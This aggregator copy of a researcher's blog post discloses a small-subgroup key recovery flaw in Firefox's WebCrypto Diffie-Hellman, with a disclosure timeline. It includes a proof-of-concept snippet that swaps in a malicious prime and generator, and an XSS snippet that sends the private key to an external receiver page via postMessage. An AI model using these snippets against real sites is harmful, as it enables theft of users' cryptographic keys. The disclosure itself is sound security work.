<!DOCTYPE html>
<html lang="en">
<head>
    <title>
The Curious Case of WebCrypto Diffie-Hellman on Firefox - Small Subgroups Key Recovery Attack on DH -
linksfor.dev(s)
    </title>
	<link rel="alternate" type="application/rss+xml" title="Linksfor.dev(s) feed" href="https://linksfor.dev/feed.rss" />
    <meta charset="utf-8">
    <meta name="Description" content="A curated source of links that devs might find interesting. Updated around the clock." />
    <meta name="google" value="notranslate">
    <link rel="stylesheet" type="text/css" href="/style.css" />
</head>
<body>
    <div class="grid">
        
<div class="readable">
    <h1>The Curious Case of WebCrypto Diffie-Hellman on Firefox - Small Subgroups Key Recovery Attack on DH</h1>
    <div class="page_body">
<p class="centered">
<main class="centered-bottom" id="main">
<div class="main section" id="page_body">
<div class="widget Blog" id="Blog1">
<div class="blog-posts hfeed container">
<article class="post-outer-container">
<div class="post-outer">
<div class="post-content container"> <div class="post-body-container">
<div class="post-body entry-content float-container" id="post-body-7432388175917295566">
<div>
<b>tl;dr </b>Mozilla Firefox prior to version 72 suffers from <i>Small Subgroups Key Recovery Attack on DH</i> in the <i><b>WebCrypto</b></i>&apos;s API. The Firefox&apos;s team fixed the issue <u><b>r</b><b>emoving completely</b></u> support for DH over finite fields (that is not in the WebCrypto standard). If you find this interesting read further below.</div> <div>
In this blog post I assume you are already knowledgeable about Diffie-Hellman over finite fields and related attacks. If not I recommend to read any cryptography book that covers public key cryptography. Here is a really cool simple explanation by <a href="https://twitter.com/cryptodavidw">David Wong</a>:<br> If you want more details about <i><b>Small Subgroups Key Recovery Attack on DH</b></i> I covered some background in one of my previous post (<a href="https://blog.intothesymmetry.com/2016/01/openssl-key-recovery-attack-on-dh-small.html">OpenSSL Key Recovery Attack on DH small subgroups (CVE-2016-0701)</a> ). There is also an <a href="https://eprint.iacr.org/2016/995.pdf">academic pape</a><a href="https://www.blogger.com/null">r</a> where we examine the issue with some more rigors. If you want to read the original attack I recommend the <a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.44.5296">Lim-Lee</a>&apos;s seminal paper.</div> <div>
The <a href="https://www.w3.org/TR/WebCryptoAPI/">Web Cryptography API</a> is a specification that describes a JavaScript API for performing basic cryptographic operations in web applications. This was always a controversial topic between people in the crypto arena and you can read some eminent opinion in the wild e.g. :</div> <div>
Said that this post is not about the usefulness of WebCrypto so I&apos;ll spare you my opinion on the topic :p</div> <div>
Ok you might say, now we have three paragraphs about WebCrypto but how is this looking like? Luckily the good <a href="https://github.com/diafygi">diafygi</a> comes to the rescue with a <a href="https://diafygi.github.io/webcrypto-examples/">full page of examples</a></div> <table class="tr-caption-container"><tbody>
<tr><td><a href="https://1.bp.blogspot.com/-RKsVLpqIoAQ/Xg9Pa5KHjmI/AAAAAAAADWU/-M7FasHUXu8u5SxyRvdMH-33qKWkR6RpACLcBGAsYHQ/s1600/Screen%2BShot%2B2020-01-03%2Bat%2B3.27.32%2BPM.png"><img src="https://1.bp.blogspot.com/-RKsVLpqIoAQ/Xg9Pa5KHjmI/AAAAAAAADWU/-M7FasHUXu8u5SxyRvdMH-33qKWkR6RpACLcBGAsYHQ/s640/Screen%2BShot%2B2020-01-03%2Bat%2B3.27.32%2BPM.png" width="640"></a></td></tr>
<tr><td class="tr-caption"><b>WebCrypto API Live table</b></td></tr>
</tbody></table> <br>
<div>
Really simple no? In a similar way of encrypting using <b><i>AES-GCM </i></b>the WebCrypto API provides you simple ways for using <i><b>HMAC</b></i>, <i><b>RSA</b></i>, <i><b>ECDSA</b></i>, <i><b>ECDH</b></i> and so on... Beautiful. So how popular is this API? Luckily we can even have an answer for it thanks to telemetry (and <a href="https://twitter.com/_franziskus_">Franziskus Kiefer</a> that showed it to me):<br>
<table class="tr-caption-container"><tbody>
<tr><td><a href="https://1.bp.blogspot.com/-1dB-BPHnQ4w/Xg9dOyKzuAI/AAAAAAAADWg/fLmWrMte6oskYvZS23Z7E_b9tXqUSo4vQCLcBGAsYHQ/s1600/Screen%2BShot%2B2020-01-03%2Bat%2B4.26.04%2BPM.png"><img src="https://1.bp.blogspot.com/-1dB-BPHnQ4w/Xg9dOyKzuAI/AAAAAAAADWg/fLmWrMte6oskYvZS23Z7E_b9tXqUSo4vQCLcBGAsYHQ/s640/Screen%2BShot%2B2020-01-03%2Bat%2B4.26.04%2BPM.png" width="640"></a></td></tr>
<tr><td class="tr-caption"><b>WebCrypto Firefox Telemetry</b></td></tr>
</tbody></table>
The graph above is taken directly from <a href="https://telemetry.mozilla.org/new-pipeline/dist.html#!cumulative=0&amp;end_date=2019-12-05&amp;include_spill=0&amp;keys=__none__!__none__!__none__&amp;max_channel_version=nightly%252F72&amp;measure=WEBCRYPTO_ALG&amp;min_channel_version=nightly%252F62&amp;processType=*&amp;product=Firefox&amp;sanitize=0&amp;sort_by_value=0&amp;sort_keys=submissions&amp;start_date=2019-10-21&amp;table=0&amp;trim=1&amp;use_submission_date=0">Firefox&apos;s telemetry</a> but what are those weird numbers? Well in order to make some sense out of it you need to look at <a href="https://searchfox.org/mozilla-central/source/dom/crypto/WebCryptoTask.cpp#59">the source code</a>!!! :<br>
<div class="separator">
<a href="https://1.bp.blogspot.com/-TLqjsnJLDuo/Xg9d-pkQT2I/AAAAAAAADWo/-RNxWMexxRcwIGHYQeBQxrI1NcjFXA-swCLcBGAsYHQ/s1600/Screen%2BShot%2B2020-01-03%2Bat%2B4.29.45%2BPM.png"><img src="https://1.bp.blogspot.com/-TLqjsnJLDuo/Xg9d-pkQT2I/AAAAAAAADWo/-RNxWMexxRcwIGHYQeBQxrI1NcjFXA-swCLcBGAsYHQ/s640/Screen%2BShot%2B2020-01-03%2Bat%2B4.29.45%2BPM.png" width="572"></a></div>
So for some weird reason <i><b>AES CBC </b></i>is the most used method in Firefox nightly 72 followed by the two <i><b>SHA</b></i> methods.<br> There are many places in the web where WebCrypto security is discussed in depth. Some pointers are <a href="https://twitter.com/harryhalpin">Harry Halpin</a> slides delivered at <a href="https://csrc.nist.gov/csrc/media/events/ssr-2016-security-standardisation-research/documents/presentation-mon-halpin.pdf">Security Standardization Research Conference</a> or <a href="https://twitter.com/ttaubert">Tim Taubert</a> talk at <a href="https://2014.jsconf.eu/speakers/tim-taubert-keeping-secrets-with-javascript-an-introduction-to-the-webcrypto-api.html">JS Conf</a>.&#xA0; Said that, this is the way a colleague of mine at <a href="https://www.nds.ruhr-uni-bochum.de/chair/news/">Ruhr-Universit&#xE4;t Bochum</a> described it and I found the parallelism great:<br>
<div class="separator">
<a href="https://1.bp.blogspot.com/-OrF1nT-secY/XhL_iu4DPTI/AAAAAAAADW4/NzAl0kMsAaApxnySrzexOvsjsetNF0zOQCLcBGAsYHQ/s1600/Screen%2BShot%2B2020-01-06%2Bat%2B9.41.24%2BAM.png"><img src="https://1.bp.blogspot.com/-OrF1nT-secY/XhL_iu4DPTI/AAAAAAAADW4/NzAl0kMsAaApxnySrzexOvsjsetNF0zOQCLcBGAsYHQ/s640/Screen%2BShot%2B2020-01-06%2Bat%2B9.41.24%2BAM.png" width="640"></a></div>
So what does it mean? Well basically when a cryptographic key is <i>created/imported</i>, there is an <span><b>extractable</b> </span>property that if set to <b><span>false</span> </b>will not allow (as the property name hints) the extraction of raw key material (aka the value of the key).&#xA0; So even if an attacker will be able to gain <u><b>XSS privilege he will not be able to steal the key</b></u>!!. See the&#xA0; example below :<br> <span>In this example an exception is caught&#xA0; and logged at <span>line 29</span>:</span><br>
<b><span><span class="message-body-wrapper"><span class="message-flex-body"><span class="message-body devtools-monospace"><span class="objectBox-stackTrace">DOMException: &quot;A parameter or an operation is not supported by the underlying object&quot;</span></span></span></span></span></b><br>
<span><span class="message-body-wrapper"><span class="message-flex-body"><span class="message-body devtools-monospace"><span class="objectBox-stackTrace">The reason is because the key is declared as not extractable at <span>line 7<span>.</span></span></span></span></span></span></span><br> So we arrived to talk about <a href="https://github.com/diafygi/webcrypto-examples/#dh">WebCrypto DH</a>. Let&apos;s go directly to the point. <i><b>Diffie-Hellman over finite fields </b></i>(DH from now on) is not in the WebCrypto specification and is (until today) implemented only by Mozilla Firefox (for the record from <b><i>Elliptic Curve Diffie-Hellman -ECDH</i></b> is instead<a href="https://www.w3.org/TR/WebCryptoAPI/#ecdh"><b> part of the specification</b></a>). This was argument of&#xA0; a <a href="https://lists.w3.org/Archives/Public/public-webcrypto/2015Oct/0000.html">little debate during the specification development</a> but at the end <a href="https://twitter.com/sleevi_">Ryan Sleevi</a> made <a href="https://lists.w3.org/Archives/Public/public-webcrypto/2015Oct/0004.html">the point</a> (BTW Google Chrome <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=438391">never implemented it</a>)<br>
For some reason Mozilla Firefox decided to keep the implementation of&#xA0; <b><i>WebCrypto DH</i></b>. Now a typical potential<b><i> WebCrypto DH</i></b> scenario usage is the following:<br>
<ol>
<li><i>Alice</i> <b>generates</b> a DH <b>key pair</b> and send to <i>Bob&#xA0;</i></li> <li><i>Bob</i> <b>generates</b> his own <b>key pair</b></li>
<li><i>Bob</i> can now <b>derive</b> a shared secret to use for example as a secret key for <b>AES-GCM</b> encryption (as above)</li> </ol> Pfiuuu so let&apos;s talk about the bug. One of the biggest criticism that people makes about DH is that the choice of parameters is error prone. Indeed differently from <b>ECDH </b>where the set of curves to use is limited (<i><b>P-256</b></i> and <i><b>Curve25519</b></i> are probably covering almost 100% of the use cases) for the finite field case it is possible to use any prime number that is sufficiently large (also for this case exist some specification that suggest some specific numbers, see also my previous <a href="https://blog.intothesymmetry.com/2016/01/what-heck-is-rfc-5114.html">post</a>). In order to avoid most of the attacks a prime number used for DH needs to cover two important requirements:</div> <div>
<ol>
<li>Being sufficiently large (at least 2048 bits in 2019)</li>
<li>Being <span>p</span> the prime number chosen <span>p-1</span> needs to be not smooth (again refer to my previous 2 posts for more details <a href="https://blog.intothesymmetry.com/2016/01/what-heck-is-rfc-5114.html">1</a>,<a href="https://blog.intothesymmetry.com/2016/01/openssl-key-recovery-attack-on-dh-small.html">2</a>). Many primes in the specifications are so called <a href="https://en.wikipedia.org/wiki/Safe_prime">safe primes</a> in order to meet the non smoothness requirement.</li>
</ol>
Now let&apos;s assume a website implement the scenario depicted above with a <i><b>safe prime</b></i> taken from some IETF specification and let&apos;s also assume an attacker was able to gain some <u><b>XSS privilege</b></u> in this website. The following snippet shows how the attacker will be able to recover the private key using the <i><b>Small Subgroups Key Recovery Attack</b></i> (I am a biiiiiiit lazy and I extracted only the key modulo 5, a full attack would use several prime numbers and then <a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem"><i><b>Chinese Remainder Theorem- </b><b>CRT</b></i></a> to recover the full key, again you can find full explanation in my previous<b> <a href="https://blog.intothesymmetry.com/2016/01/openssl-key-recovery-attack-on-dh-small.html">OpenSSL blog pos</a><a href="https://www.blogger.com/null">t</a></b>).
<br>
The vulnerable code is the one at <span>line 7</span> and<span> line 8 </span><span>:</span><br>
<div>
<span><span>const MALICIOUS_PRIME = new Uint8Array([129,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17]);<br>&#xA0;&#xA0;&#xA0; // this generator has order 5</span></span></div>
<div>
<span><span>const MALICIOUS_GENERATOR = new Uint8Array([46,35,147,92,93,21,176,170,70,144,93,164,112,85,178,126]);</span></span><b><span><span> </span></span></b></div>
<div>
<b><span><span>privateKey.algorithm.prime = MALICIOUS_PRIME;<br>privateKey.algorithm.generator = MALICIOUS_GENERATOR;&#xA0;</span></span></b>&#xA0;
<span></span>&#xA0;</div> Let me explain, what the attacker achieved here was to:<ol>
<li><span>Craft a malicious<b> prime number </b>(the prime number used in this example is <span>171470411456254147604591110776164450321</span> that has <span>p-1</span> equals to <span>2^4 * 5 * 23 * 2082757 * 744748579247 * 60079053324863537&#xA0;</span> (so it is kind of smooth)</span></li>
<li><span>Forge a malicious <b>generator </b>(in this example I used a generator of <u><b><span>order 5</span></b></u>, see also the <span>p-1</span> above)</span></li>
<li><b><span>Redefine the generator and the prime associated with the existing private key!!!!</span></b><u><b><span> (THIS IS THE REAL BUG)</span></b></u></li>
<li><span>Repeat this with many <b>prime numbers/generators</b></span></li>
<li><span>Use <b>CRT</b> to recover&#xA0; the full private key</span></li>
</ol>
<span>Well that&apos;s about it. Luckily as the telemetry data showed this API (but the WebCrypto API in general is not really used/popular) so Firefox could safely remove completely this non standard API rather than fix the bug<span>.</span></span><br>
<h2>
<span>Demo Time</span></h2>
You can find a simple demo at <a href="https://asanso.github.io/firefox/victim.html">https://asanso.github.io/firefox/victim.html</a> . It simply does an <span>alert()</span> with the extracted <b>private key modulo 5</b>. As said I was a lazy to implement the full attack (sorry :( ) but I hope you got the point. As a bonus point though I added some little snippet on how an attacker could exfiltrate the key using <span>postMessage:</span><br>
<div><b>&#xA0;&#xA0;&#xA0; //XSS starts here&#xA0;&#xA0;&#xA0; //exfiltrate the privateKey through postMessage<p>&#xA0;&#xA0;&#xA0; //the attacker receiver domanin can of course be different</p></b>&#xA0;&#xA0;&#xA0; var ifr = document.createElement(&quot;iframe&quot;)&#xA0;&#xA0;&#xA0; ifr.src = &quot;https://asanso.github.io/firefox/receiver.html&quot;&#xA0;&#xA0;&#xA0; ifr.id = &quot;frm&quot;;&#xA0;&#xA0;&#xA0; document.body.appendChild(ifr);&#xA0;&#xA0;&#xA0; var frm = document.getElementById(&apos;frm&apos;).contentWindow;<p>&#xA0;&#xA0;&#xA0; frm.postMessage(kpE.privateKey,&quot;https://asanso.github.io/firefox/receiver.html&quot;);</p></div><br> <b>27-06-2018 - </b>Reported the issue via bugzilla: <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1471684">Bug 1471684</a><br>
<b><b>28-06-2018 </b>- </b>Firefox security team confirmed the vulnerability (setting impact to <b>Moderate</b>)<br>
<b>28-03-2019 -</b> <span><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1539578">Bug 1539578</a>: <i>Add telemetry for DH use in WebCrypto API</i> was created</span><br>
<b>28-10-2019 -</b> <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1564509">Bug 1564509</a>: <i>Remove support for DH from WebCrypto API (not in spec)</i> was created<br>
<b>07-01-2019 - </b>Firefox 72 containing the fix was released<br>
<b></b><br> </div>
<div>
I would like to thank <a href="https://twitter.com/_franziskus_">Franziskus Kiefer</a> and all the Firefox Security team, as usual you rock!</div> </div> </div> </div>
</div> </article>
</div>
</div><div class="widget PopularPosts" id="PopularPosts1"> <div>
<article class="post">
<div class="post-outer-container">
<div class="post-outer"> <div class="post-content container"> <div class="container post-body entry-content" id="post-snippet-2235833002254502540">
<div class="post-snippet snippet-container r-snippet-container">
<div class="snippet-item r-snippetized">
<b>Usual Mandatory Disclaimer:</b> IANAC (I am not a cryptographer) so I might likely end up writing a bunch of mistakes in this blog post...<p> tl;dr The OpenSSL 1.0.2 releases suffer from a <a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.44.5296">Key Recovery Attack on DH small subgroups</a>. This issue got assigned CVE-2016-0701 with a severity of High and OpenSSL 1.0.2 users should upgrade to 1.0.2f. If an application is using DH configured with parameters based on primes that are not <a href="https://en.wikipedia.org/wiki/Safe_prime">&quot;safe&quot;</a> or not <a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.44.5296">Lim-Lee</a> (as the one in <a href="https://tools.ietf.org/html/rfc5114">RFC 5114</a>) and either Static DH ciphersuites are used or DHE ciphersuites with the default OpenSSL configuration (in particular SSL_OP_SINGLE_DH_USE is not set) then is vulnerable to this attack.&#xA0; It is believed that many popular applications (e.g. Apache mod_ssl) do set the&#xA0; SSL_OP_SINGLE_DH_USE option and would therefore not be at risk (for DHE ciphersuites), they still might be for Static DH ciphersuites. </p><br> Introduction
So if you are still here it means you wanna know more. And here is the thing. In my <a href="http://intothesymmetry.blogspot.ch/2016/01/what-heck-is-rfc-5114.html">last blog post</a> I was &#x2026;
</div>
<a class="snippet-fade r-snippet-fade hidden" href="https://blog.intothesymmetry.com/2016/01/openssl-key-recovery-attack-on-dh-small.html"></a>
</div>
</div> </div>
</div>
</div>
</article>
<article class="post">
<div class="post-outer-container">
<div class="post-outer">
<a class="snippet-thumbnail" href="https://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html">
<span class="snippet-thumbnail-img" id="snippet_thumbnail_id_8996972327010530137"></span> </a>
<div class="post-content container"> <div class="container post-body entry-content" id="post-snippet-8996972327010530137">
<div class="post-snippet snippet-container r-snippet-container">
<div class="snippet-item r-snippetized">
<b>tl;dr</b>&#xA0; I was able to hijack the OAuth tokens of <b>EVERY</b>Paypal OAuth application with a really simple trick. <br>
Introduction
If you have been following this blog you might have got tired of how many times&#xA0; <a href="http://blog.intothesymmetry.com/2016/05/holy-redirecturi-batman.html">I have stressed out </a>the importance of the redirect_uri parameter in the OAuth flow. This simple parameter might be source of many headaches for any maintainer of OAuth installations being it a client or a server.<p>
Accepting the risk of repeating myself here is two simple suggestions that may help you stay away from troubles (you can always skip this part and going directly to the <b>Paypal Vulnerability</b> section):</p><br><i>If you are building an OAuth client,&#xA0;&#xA0;</i> <i>Thou shall register a redirect_uri as much as specific as you can</i> i.e. if your OAuth client callback is https://yourouauthclient.com/oauth/oauthprovider/callback then<p>DO register <b>https://yourouauthclient.com/oauth/oauthprovider/callback</b>NOT JUST h<b>ttps://yourouauthclient.com/</b> or <b>https://yourouauthclient.com/oauth</b>
If you are still not convinced <a href="http://blog.intothesymmetry.com/2015/06/on-oauth-token-hijacks-for-fun-and.html">here&#x2026;</a>
</p></div>
<a class="snippet-fade r-snippet-fade hidden" href="https://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html"></a>
</div>
</div> </div>
</div>
</div>
</article>
<article class="post">
<div class="post-outer-container">
<div class="post-outer">
<a class="snippet-thumbnail" href="https://blog.intothesymmetry.com/2017/03/critical-vulnerability-in-json-web.html">
<span class="snippet-thumbnail-img" id="snippet_thumbnail_id_2944417194682605697"></span> </a>
<div class="post-content container"> <div class="container post-body entry-content" id="post-snippet-2944417194682605697">
<div class="post-snippet snippet-container r-snippet-container"> <a class="snippet-fade r-snippet-fade hidden" href="https://blog.intothesymmetry.com/2017/03/critical-vulnerability-in-json-web.html"></a>
</div>
</div> </div>
</div>
</div>
</article>
</div>
</div></div>
</main>
</p>
</div>
</div>
    </div>
    <footer>
        <div>created by buildstarted &copy; 2020 <a href="/about">about</a></div>
        <div>Share this page on social media: copy and paste this url https://linksfor.dev/</div>
    </footer>
    
    <script>
        (function() {
            var COLLECT_URL = "https://dna.buildstarted.com/t";
            var SITE_ID = "linksfor.devs";
            var GLOBAL_VAR_NAME = "__DNA__";

            window[GLOBAL_VAR_NAME] = {};

            window[GLOBAL_VAR_NAME].sendPageView = function() {
                var path = location.pathname;
                var referrer = document.referrer;

                var url = COLLECT_URL + "?siteid=" + SITE_ID + "&p=" + encodeURIComponent(path) + "&r=" + encodeURIComponent(referrer);

                try { fetch(url, { method: "GET" }); } catch (e) {}
            };

            window[GLOBAL_VAR_NAME].sendPageView();
        })();
    </script>
</body>
</html>